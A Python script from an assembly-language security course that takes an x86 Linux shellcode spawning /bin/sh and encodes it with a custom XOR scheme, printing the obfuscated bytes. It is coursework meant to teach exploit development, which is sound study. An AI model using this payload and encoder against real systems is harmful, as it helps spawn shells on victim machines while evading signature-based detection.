#!/usr/bin/python
#
#This code has been created for completing the requirements of the SecurityTube Linux Assembly Expertcertification:
#  	
#   http://securitytube-­training.com/online-courses/securitytube-linux-assembly-expert/  
#
#Student ID: SLAE-1537
#
 

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

n = len(bytearray(shellcode))

print 'Encoded shellcode ...'

#first two bytes are special case, so we will XOR them outside the loop
#encode the first byte by XORing it with the second
y = bytearray(shellcode)[0]^bytearray(shellcode)[1]
encoded += '\\x'
encoded += '%02x' % y

encoded2 += '0x'
encoded2 += '%02x,' %y

#encode the second byte by XORing it with the encoded first byte
y ^= bytearray(shellcode)[1]
encoded += '\\x'
encoded += '%02x' % y

encoded2 += '0x'
encoded2 += '%02x,' %y

n = 1
# from here y  will always hold the previous XOR result to use it when there is similar contiguous bytes
for x in bytearray(shellcode)[2:]:
	#check if the byte equal to the previous 
	if x == bytearray(shellcode)[n]:
		#if similar use the same result of the previous XOR
		encoded += '\\x'
		encoded += '%02x' % y

		encoded2 += '0x'
		encoded2 += '%02x,' %y
		n += 1
	else:
		#if they are not equal, we will XOR the current with the previous
		y = x^bytearray(shellcode)[n]
		encoded += '\\x'
		encoded += '%02x' % y

		encoded2 += '0x'
		encoded2 += '%02x,' %y
		n += 1


print encoded

print encoded2


print 'Len: %d' % len(bytearray(shellcode))
